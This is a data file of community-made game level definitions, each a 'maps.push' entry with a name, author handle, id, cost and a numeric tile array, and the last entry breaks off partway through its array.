maps.push({name="CheckerBoard",author="MoistNoodlez",id="#1660695930",direction="forward",cost=213,elevation=0,map=[0,0,0,0,0,0,5,5,5,5,2,2,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,24,5,24,5,24,5,24,5,24,5,24,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,5,24,5,24,5,24,5,24,5,24,5,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,24,5,24,5,24,5,24,5,24,5,24,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,5,24,5,24,5,24,5,24,5,24,5,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,24,5,24,5,24,5,24,5,24,5,24,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,5,24,5,24,5,24,5,24,5,24,5,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,24,5,24,5,24,5,24,5,24,5,24,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,5,24,5,24,5,24,5,24,5,24,5,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,95,95,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0]});
maps.push({name="Double Dicker",author="MoistNoodlez",id="#1660698536",direction="forward",cost=306,elevation=0,map=[0,0,0,64,92,58,45,2,2,45,45,58,92,64,0,0,0,0,0,0,0,0,0,64,64,58,45,45,45,45,45,58,64,64,0,0,0,0,0,0,0,0,0,0,64,58,46,46,46,46,46,58,64,0,0,0,0,0,0,0,0,0,0,0,64,58,46,46,76,46,46,58,64,0,0,0,0,0,0,0,0,0,0,0,64,58,47,47,76,47,47,58,64,0,0,0,0,0,0,0,0,0,0,0,64,58,47,76,76,76,47,58,64,0,0,0,0,0,0,0,0,0,0,0,64,58,48,48,48,76,48,58,64,0,0,0,0,0,0,0,0,0,0,0,64,58,48,48,48,76,48,58,64,0,0,0,0,0,0,0,0,0,0,0,64,58,48,48,48,76,76,58,64,0,0,0,0,0,0,0,0,0,0,0,64,58,49,76,49,49,49,58,64,0,0,0,0,0,0,0,0,0,0,0,64,58,49,76,49,49,49,58,64,0,0,0,0,0,0,0,0,0,0,0,64,58,49,76,49,49,49,58,64,0,0,0,0,0,0,0,0,0,0,0,64,58,76,76,76,76,48,58,64,0,0,0,0,0,0,0,93,64,64,64,64,58,76,48,48,76,48,58,64,64,64,64,93,0,0,0,93,64,58,58,58,58,48,48,48,48,48,58,58,58,58,64,93,0,0,0,93,64,58,92,47,47,47,47,47,47,47,47,47,92,58,64,93,0,0,0,93,64,58,92,46,46,46,46,46,46,46,46,46,92,58,64,93,0,0,0,93,64,58,92,46,46,88,46,46,46,88,46,46,92,58,64,93,0,0,0,93,64,58,92,45,45,45,45,45,45,45,45,45,92,58,64,93,0,0,0,93,64,58,58,58,58,45,45,2,2,45,58,58,58,58,64,93,0,0,0]});
maps.push({name="House Party",author="MoistNoodlez",id="#1660699413",direction="forward",cost=351,elevation=0,map=[1,1,1,1,1,1,1,1,1,1,1,2,2,1,1,0,0,0,0,0,1,121,55,55,55,55,55,55,55,121,10,10,10,10,1,0,0,0,0,0,1,121,55,49,92,49,55,89,55,121,10,10,10,10,1,0,0,0,0,0,1,121,55,49,49,49,55,89,55,121,10,10,10,10,1,0,0,0,0,0,1,121,55,49,49,49,55,55,55,121,10,10,10,10,1,0,0,0,0,0,1,121,55,49,89,49,55,55,55,121,10,66,66,10,1,0,0,0,0,0,1,121,55,89,49,49,55,89,55,121,10,66,66,10,1,0,0,0,0,0,1,121,55,49,49,49,55,55,55,121,10,66,66,10,1,0,0,0,0,0,1,121,55,49,66,49,49,49,49,109,10,66,66,10,1,0,0,0,0,0,1,121,55,49,68,49,49,49,49,109,10,66,66,10,1,0,0,0,0,0,1,121,55,55,69,55,55,55,55,121,10,66,66,10,1,0,0,0,0,0,1,121,89,55,69,55,89,55,55,121,10,66,66,10,1,0,0,0,0,0,1,121,55,55,69,55,55,92,55,121,10,66,66,10,1,0,0,0,0,0,1,121,121,121,69,121,121,121,121,121,10,66,66,10,1,0,0,0,0,0,1,89,21,10,68,10,10,10,10,10,10,66,66,10,1,0,0,0,0,0,1,89,21,10,66,68,68,68,68,68,68,66,66,10,1,0,0,0,0,0,1,21,21,10,10,10,10,10,10,10,10,10,10,10,1,0,0,0,0,0,1,93,21,10,10,10,10,10,10,10,10,10,10,10,1,0,0,0,0,0,1,97,21,10,10,94,10,94,10,10,10,96,96,10,1,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,2,2,1,1,0,0,0,0,0]});
maps.push({name="Easy Crouches",author="MoistNoodlez",id="#1660700416",direction="forward",cost=144,elevation=0,map=[0,0,0,0,0,0,1,64,2,2,64,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,64,64,64,64,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,61,61,61,61,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,61,61,61,61,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,58,58,58,58,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,58,58,58,58,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,55,55,55,55,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,55,55,55,55,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,52,52,52,52,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,52,52,52,52,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,49,49,49,49,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,49,49,49,49,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,46,46,46,46,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,95,95,95,95,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,46,46,46,46,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,3,92,92,3,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,55,55,55,55,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,92,3,3,92,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,24,24,24,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,24,2,2,24,1,0,0,0,0,0,0,0,0]});
maps.push({name="Slide Ring",author="MoistNoodlez",id="#1660700635",direction="forward",cost=375,elevation=0,map=[0,0,0,0,0,0,0,1,2,2,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,14,14,135,135,135,100,1,0,0,0,0,0,0,0,0,0,0,1,135,135,135,135,135,135,135,135,1,0,0,0,0,0,0,0,0,0,1,135,135,135,135,135,135,135,135,135,1,0,0,0,0,0,0,0,0,0,1,135,135,135,135,135,135,135,135,135,135,1,0,0,0,0,0,0,0,1,100,135,135,135,135,135,135,135,135,135,135,1,0,0,0,0,0,0,0,1,135,135,135,135,135,135,135,135,135,135,135,1,0,0,0,0,0,0,0,1,135,135,135,135,1,1,1,135,135,135,135,1,0,0,0,0,0,0,0,1,135,135,135,135,1,1,1,135,135,135,135,1,0,0,0,0,0,0,0,1,135,135,135,135,1,1,1,135,135,135,135,1,0,0,0,0,0,0,0,1,135,135,135,135,1,1,1,135,135,135,135,1,0,0,0,0,0,0,0,1,135,135,135,135,1,1,135,135,135,135,135,1,0,0,0,0,0,0,0,1,135,135,135,135,1,1,135,135,135,135,135,1,0,0,0,0,0,0,0,1,135,135,135,135,1,135,135,135,135,135,135,1,0,0,0,0,0,0,0,1,135,135,135,135,135,135,135,135,135,135,135,1,0,0,0,0,0,0,0,1,135,135,135,135,135,135,135,135,135,135,100,1,0,0,0,0,0,0,0,0,1,100,135,135,135,135,135,135,135,135,1,0,0,0,0,0,0,0,0,0,0,1,135,135,135,135,135,135,135,1,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,1,0,0,0,0,0,0,0,0]});
maps.push({name="Shitter",author="MoistNoodlez",id="#1660701345",direction="forward",cost=112,elevation=0,map=[0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,5,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,5,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,0,0,0,5,5,0,0,0,5,5,5,5,5,0,0,0,5,0,0,0,0,0,0,5,0,0,5,5,5,5,0,0,5,5,0,0,5,0,0,0,0,0,0,5,0,5,5,5,0,0,0,0,0,5,5,91,91,91,91,91,0,0,0,5,5,5,5,0,0,0,0,0,0,0,91,91,91,91,91,91,25,0,0,5,5,0,0,0,0,0,0,0,0,0,0,91,5,5,5,0,0,0,0,100,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,5,0,5,5,5,0,0,5,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,5,5,93,0,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2]});
maps.push({name="quick ladders",author="king buzzo",id="#1660734785",direction="forward",cost=157,elevation=13,map=[0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,5,5,5,5,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,5,5,5,5,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,6,6,6,6,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,7,7,7,7,25,0,0,0,0,0,0,0,0,0,0,0,0,25,25,25,8,8,8,8,25,25,25,0,0,0,0,0,0,0,0,0,25,0,0,0,8,8,85,8,0,0,0,25,0,0,0,0,0,0,0,0,25,0,0,0,8,85,8,8,0,0,0,25,0,0,0,0,0,0,0,0,25,3,24,24,8,8,85,8,24,24,3,25,0,0,0,0,0,0,0,0,0,0,5,65,8,8,8,8,65,5,0,0,0,0,0,0,0,0,0,0,0,0,5,65,65,65,65,65,65,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,6,6,0,0,9,93,0,0,0,0,0,0,0,0,1,0,0,0,7,7,7,7,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,8,8,8,8,0,14,1,0,0,0,0,0,0,0,0,0,1,0,0,0,3,3,3,3,0,0,0,1,0,0,0,0,0,0,0,0,0,0,18,18,18,18,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,18,75,18,1,1,18,75,18,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,1,1,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,2,2,18,0,0,0,0,0,0,0,0,0]});
maps.push({name="Box",author="TF2 Pencil",id="#1660753643",direction="forward",cost=212,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,56,56,1,1,1,1,1,1,0,0,0,0,0,0,1,56,56,56,56,56,56,56,56,56,56,56,56,1,0,0,0,0,0,0,1,56,56,56,56,56,56,56,56,56,56,56,56,1,0,0,0,0,0,0,1,56,56,56,56,56,56,56,56,56,56,56,56,1,0,0,0,0,0,0,1,56,56,56,56,56,56,56,56,56,56,56,56,1,0,0,0,0,0,0,1,56,56,56,56,56,56,56,56,56,56,56,56,1,0,0,0,0,0,0,1,56,56,56,56,56,56,56,56,56,56,56,56,1,0,0,0,0,0,0,1,56,56,56,56,56,56,56,56,56,56,56,56,1,0,0,0,0,0,0,1,56,56,56,56,56,56,56,56,56,56,56,56,1,0,0,0,0,0,0,1,56,56,56,56,56,56,56,56,56,56,56,56,1,0,0,0,0,0,0,1,56,56,56,56,56,56,56,56,56,56,56,56,1,0,0,0,0,0,0,1,56,56,56,56,56,56,56,56,56,56,56,56,1,0,0,0,0,0,0,1,56,56,56,56,56,56,56,56,56,56,56,56,1,0,0,0,0,0,0,1,1,1,1,1,1,56,56,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,95,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Swimming Pools",author="TF2 Pencil",id="#1660753703",direction="forward",cost=409,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,14,14,1,0,0,1,97,14,14,14,1,14,14,14,14,14,14,14,14,14,14,14,1,0,0,1,14,65,66,14,1,14,65,65,65,65,65,65,65,65,14,14,1,0,0,1,14,66,66,14,1,14,65,65,65,65,65,65,65,65,14,14,1,0,0,1,14,14,68,14,1,14,65,65,65,65,65,65,65,65,14,14,1,0,0,1,1,1,69,1,1,14,14,14,14,14,14,14,14,14,14,14,1,0,0,1,97,14,68,14,14,14,14,14,14,14,65,65,65,65,65,14,1,0,0,1,14,14,68,66,66,66,66,66,66,14,65,66,66,66,65,14,1,0,0,1,14,14,14,66,66,66,66,66,66,14,65,66,66,66,65,14,1,0,0,1,14,14,14,66,66,14,14,66,66,14,65,66,66,66,65,14,1,0,0,1,14,14,14,66,66,97,14,66,66,14,65,66,66,66,65,14,1,0,0,1,14,14,14,66,66,66,66,66,66,14,65,66,66,66,65,14,1,0,0,1,14,14,14,66,66,66,66,66,66,14,65,66,66,66,65,14,1,0,0,1,14,14,14,14,14,14,14,14,14,14,65,65,65,65,65,14,1,0,0,1,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,97,1,0,0,1,96,96,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Around for shortcut",author="TF2 Pencil",id="#1660753788",direction="right",cost=149,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,14,14,14,0,0,0,0,0,0,0,1,14,14,1,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,1,14,14,1,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,1,96,96,1,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,1,14,14,1,0,0,0,0,0,0,0,92,0,0,0,0,0,0,0,0,1,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,97,14,14,14,14,14,14,14,2,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,2,0,0,0,0,0,0,0,0,0,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,18,0,20,0,0,0,0,0,0,0,14,14,14,0,0,0,0,16,16,0,18,0,20,0,22,22,0,0,0,0,14,14,14,0,0,0,0,0,0,0,0,0,0,0,22,22,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,3,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Chess or Checkers",author="TF2 Pencil",id="#1660753950",direction="forward",cost=584,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,32,32,1,0,0,1,76,76,12,12,76,76,12,12,76,76,12,12,76,76,12,12,1,0,0,1,76,76,12,12,76,76,12,12,76,76,12,12,76,76,12,12,1,0,0,1,12,12,76,76,12,12,76,76,12,12,76,76,12,12,76,76,1,0,0,1,12,12,76,76,12,12,76,76,12,12,76,76,12,12,76,76,1,0,0,1,76,76,12,12,76,76,12,12,76,76,12,12,76,76,12,12,1,0,0,1,76,76,12,12,76,76,12,12,76,76,12,12,76,76,12,12,1,0,0,1,12,12,76,76,12,12,76,76,12,12,76,76,12,12,76,76,1,0,0,1,12,12,76,76,12,12,76,76,12,12,76,76,12,12,76,76,1,0,0,1,76,76,12,12,76,76,12,12,76,76,12,12,76,76,12,12,1,0,0,1,76,76,12,12,76,76,12,12,76,76,12,12,76,76,12,12,1,0,0,1,12,12,76,76,12,12,76,76,12,12,76,76,12,12,76,76,1,0,0,1,12,12,76,76,12,12,76,76,12,12,76,76,12,12,76,76,1,0,0,1,76,76,12,12,76,76,12,12,76,76,12,12,76,76,12,12,1,0,0,1,76,76,12,12,76,76,12,12,76,76,12,12,76,76,12,12,1,0,0,1,12,12,76,76,12,12,76,76,12,12,76,76,12,12,76,76,1,0,0,1,12,12,76,76,12,12,76,76,12,12,76,76,12,12,76,76,1,0,0,1,32,32,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Def Or Die",author="Wolfdiman",id="#1660756440",direction="forward",cost=430,elevation=5,map=[1,19,19,19,19,19,19,19,19,2,2,19,19,19,19,19,19,19,19,1,1,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,1,1,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,1,1,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,1,1,19,19,19,19,1,1,1,1,0,0,1,1,1,1,19,19,19,19,1,1,19,19,19,19,1,1,1,1,0,0,1,1,1,1,19,19,19,19,1,1,19,19,19,19,1,1,97,19,19,19,19,97,1,1,19,19,19,19,1,1,19,1,1,1,1,1,19,19,19,19,19,19,1,1,1,1,1,19,1,1,19,92,0,0,0,0,19,19,19,19,19,19,90,19,76,19,76,19,1,1,19,92,0,0,0,0,19,19,19,19,19,19,90,19,76,19,76,19,1,1,19,1,1,1,1,1,19,19,19,19,19,19,1,1,1,1,1,19,1,1,19,19,19,19,1,1,97,19,19,19,19,97,1,1,19,19,19,19,1,1,19,19,19,19,1,1,1,96,96,96,96,1,1,1,19,19,19,19,1,1,19,19,19,19,1,99,91,19,19,19,19,91,99,1,19,19,19,19,1,1,19,19,19,19,1,1,1,98,98,98,98,1,1,1,19,19,19,19,1,1,93,19,19,94,1,102,91,19,19,19,19,91,102,1,93,19,19,94,1,1,1,1,1,1,1,1,1,1,101,101,1,1,1,1,1,1,1,1,1,24,24,24,24,24,24,24,24,92,19,19,19,19,92,0,0,0,0,0,19,24,24,24,24,24,24,24,24,19,19,19,19,19,0,0,0,0,0,0,4,24,2,2,24,23,22,21,20,19,19,19,19,19,0,0,24,100,24,0,24]});
maps.push({name="strafe practice",author="fara",id="#1660767281",direction="forward",cost=169,elevation=0,map=[1,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,11,11,31,31,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,11,11,31,129,130,130,130,130,130,130,130,130,130,130,130,130,130,0,0,1,11,11,31,31,0,0,0,0,0,0,0,0,0,0,0,0,130,0,0,1,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,130,0,0,1,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,130,0,0,1,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,130,0,0,1,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,130,0,0,1,11,11,13,15,17,19,20,20,21,0,0,0,0,0,0,0,130,0,0,1,11,11,13,15,17,19,20,21,22,0,0,0,0,0,0,0,130,0,0,1,11,11,13,15,17,19,21,22,22,0,0,0,0,0,0,0,130,0,0,1,11,11,0,0,0,0,24,24,24,0,0,0,0,0,0,0,130,0,0,1,11,11,0,0,0,0,24,100,24,0,0,0,0,0,0,0,130,0,0,1,11,11,0,0,0,0,24,132,24,0,0,0,0,0,0,31,31,31,0,1,11,11,0,0,0,0,24,24,24,0,0,0,0,0,0,31,93,31,0,1,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,31,31,31,0,1,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,31,93,31,0,1,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,31,31,31,0,1,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,31,131,31,0]});
maps.push({name="chad",author="bunnyhop",id="#1660768643",direction="right",cost=222,elevation=-4,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,39,38,38,37,0,0,0,0,0,0,0,0,0,0,49,49,0,0,0,39,38,38,37,37,37,36,35,35,0,0,0,0,0,49,55,49,0,0,0,0,38,38,37,37,36,36,35,35,49,49,0,0,49,55,55,49,0,0,0,0,38,38,37,37,36,36,35,35,49,49,49,49,55,55,55,49,0,49,0,0,0,38,37,37,36,35,35,49,49,55,55,55,55,1,55,49,49,49,0,0,0,38,37,37,36,35,35,49,55,55,1,55,55,1,1,55,55,55,0,0,0,0,37,37,36,35,35,49,55,1,0,55,55,55,55,55,55,55,0,0,0,0,37,37,36,35,35,49,55,1,93,55,55,55,55,55,55,55,0,0,0,0,0,36,36,35,35,49,55,1,0,55,55,55,55,55,55,55,0,0,0,0,0,36,36,35,35,49,55,55,1,55,55,55,55,55,55,55,0,0,0,0,0,0,36,35,35,49,55,55,55,55,55,55,55,55,55,55,0,0,0,0,0,0,0,35,35,49,55,55,55,55,1,1,55,55,55,55,0,0,0,0,0,0,0,0,35,49,55,55,1,1,55,55,55,55,55,2,0,0,0,0,0,0,0,0,0,49,55,55,55,55,55,55,55,55,55,2,0,0,0,0,0,0,0,0,0,0,49,55,55,55,55,55,55,55,55,55,0,0,0,0,0,0,0,0,0,0,0,49,49,55,55,55,55,55,55,49,0,0,0,0,0,0,0,0,0,0,0,0,49,49,49,49,49,49,49,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="warp journey",author="fara",id="#1660769192",direction="forward",cost=257,elevation=12,map=[47,47,47,47,0,0,1,5,2,2,5,1,0,0,0,0,0,0,0,1,47,137,137,47,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,1,47,90,47,0,1,0,5,5,5,5,0,0,97,0,0,23,23,0,0,90,47,47,47,0,0,0,5,131,131,5,0,0,23,0,0,90,23,0,0,47,88,88,47,0,0,0,5,5,5,5,0,0,0,0,1,0,0,0,0,47,138,138,47,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,47,47,47,47,0,0,0,0,0,0,0,0,0,0,0,0,23,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,37,100,37,1,23,23,96,23,23,23,23,23,1,1,0,0,0,0,0,1,0,0,0,1,23,136,96,23,90,23,23,134,23,30,30,30,30,30,0,1,0,0,0,1,23,136,96,23,23,90,23,134,23,7,7,91,7,30,0,1,37,1,37,1,23,23,96,90,23,23,90,23,23,7,133,133,7,30,0,1,0,0,0,1,0,0,1,0,0,0,0,0,0,91,7,7,90,30,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,7,91,7,1,30,0,1,37,37,37,1,0,0,0,0,0,23,23,0,0,7,90,7,7,30,0,1,37,139,37,1,1,0,0,0,0,1,0,0,0,7,132,132,7,30,0,1,37,37,37,37,1,0,0,0,0,0,0,0,0,7,7,7,7,30,0,1,37,37,37,37,1,0,23,0,0,23,23,0,1,30,30,30,30,30,0,1,37,2,2,37,1,0,97,0,0,23,90,0,0]});
maps.push({name="pl",author="bunnyhop",id="#1660769240",direction="forward",cost=368,elevation=0,map=[0,0,0,0,0,0,1,1,2,2,1,1,1,1,1,1,1,1,1,1,0,0,0,0,1,1,17,17,17,17,17,17,17,17,17,17,17,17,17,17,0,0,0,1,17,17,17,18,18,18,18,18,18,18,18,18,18,18,18,18,0,0,1,17,17,18,18,18,19,19,19,19,19,19,1,18,18,18,1,19,0,1,17,17,18,18,19,19,19,19,19,19,19,19,1,19,19,19,1,19,1,17,17,18,18,1,1,20,20,20,20,20,20,20,1,19,19,19,1,20,1,17,18,18,19,1,1,20,21,21,21,21,21,21,1,18,18,18,1,21,1,17,18,19,19,20,20,20,21,22,1,22,22,22,22,1,18,1,22,22,1,17,18,19,19,20,21,21,21,22,1,22,22,22,22,22,1,22,22,22,1,17,18,19,19,20,21,22,22,22,1,22,22,22,22,22,94,22,22,22,1,17,18,19,19,20,21,22,22,22,1,22,22,22,22,22,93,22,22,22,1,17,18,19,19,20,21,21,21,22,1,22,22,22,22,22,1,22,22,22,1,17,18,19,19,20,20,20,21,22,1,22,22,22,22,1,18,1,22,22,1,17,18,18,19,1,1,20,21,21,21,21,21,21,1,18,18,18,1,21,1,17,17,18,18,1,1,20,20,20,20,20,20,20,1,19,19,19,1,20,0,1,17,17,18,18,19,19,19,19,19,19,19,19,1,19,19,19,1,19,0,0,1,17,17,18,18,18,19,19,19,19,19,19,1,18,18,18,1,18,0,0,0,1,17,17,17,18,18,18,18,18,18,18,18,18,18,18,18,18,0,0,0,0,1,1,17,17,17,17,17,17,17,17,17,17,17,17,17,17,0,0,0,0,0,0,1,1,2,2,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Loop",author="ZpLit",id="#1660772609",direction="right",cost=214,elevation=-12,map=[0,0,2,2,0,0,0,0,0,0,0,0,13,13,13,13,15,0,0,0,0,19,19,19,0,0,0,0,0,0,0,13,13,13,13,13,15,15,0,0,0,19,19,19,0,0,0,0,0,0,13,13,13,13,13,13,15,15,15,0,0,19,19,19,1,0,0,0,0,13,13,13,13,0,0,0,15,15,15,0,0,19,19,19,19,1,0,0,11,11,13,13,0,0,0,0,15,15,15,0,0,19,19,19,19,1,0,11,11,11,11,0,0,0,0,0,15,15,15,0,0,1,19,19,19,17,1,111,11,11,0,0,0,0,0,15,15,15,15,0,0,0,1,19,17,17,17,51,111,11,0,0,0,0,15,15,15,15,0,0,0,0,0,1,17,17,51,95,51,111,1,1,1,15,15,15,15,0,0,0,0,0,0,0,1,111,51,95,51,17,17,17,17,17,15,15,0,0,0,0,0,0,0,0,0,11,111,51,17,17,17,17,17,17,17,1,0,0,0,0,0,0,0,0,0,11,11,111,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,0,0,0,0,0,0,7,7,7,7,88,7,0,0,0,0,0,11,11,11,0,0,0,0,0,7,7,7,88,7,7,2,0,0,0,0,0,11,11,9,9,0,0,0,9,9,9,7,7,7,7,2,0,0,0,0,0,11,9,9,9,9,126,126,9,9,9,7,7,88,7,7,0,0,0,0,0,0,9,9,9,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,0,0,0,0,0,0,0]});
maps.push({name="Grid Walls",author="TF2 Pencil",id="#1660800852",direction="forward",cost=296,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,13,13,1,0,0,0,0,1,13,13,13,134,1,13,13,13,132,1,13,13,13,13,1,0,0,0,0,1,13,13,13,13,1,13,13,13,13,1,13,13,13,13,1,0,0,0,0,1,13,13,13,13,1,13,13,13,13,1,13,13,13,13,1,0,0,0,0,1,136,13,13,13,1,133,13,13,13,1,131,13,13,13,1,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,1,13,13,13,134,1,13,13,13,132,1,13,13,13,132,1,0,0,0,0,1,13,13,13,13,1,13,13,13,13,1,13,13,13,13,1,0,0,0,0,1,13,13,13,13,1,13,13,13,13,1,13,13,13,13,1,0,0,0,0,1,136,13,